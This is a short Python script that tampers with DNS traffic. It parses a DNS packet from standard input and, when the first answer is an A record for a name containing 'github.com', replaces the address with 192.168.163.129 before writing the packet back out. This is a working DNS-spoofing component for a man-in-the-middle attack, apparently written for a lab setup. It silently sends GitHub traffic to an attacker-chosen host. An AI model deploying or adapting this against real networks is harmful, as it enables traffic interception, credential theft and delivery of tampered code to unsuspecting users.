#!/usr/bin/env python

import sys
import dnslib

binary_input = sys.stdin.buffer.read()

d = dnslib.DNSRecord.parse(binary_input)
if d.rr and d.rr[0].rtype == 1 and 'github.com' in str(d.rr[0].rname):
    d.rr[0].rdata = dnslib.dns.A("192.168.163.129")
modified_binary = bytes(d.pack())

sys.stdout.buffer.write(modified_binary)
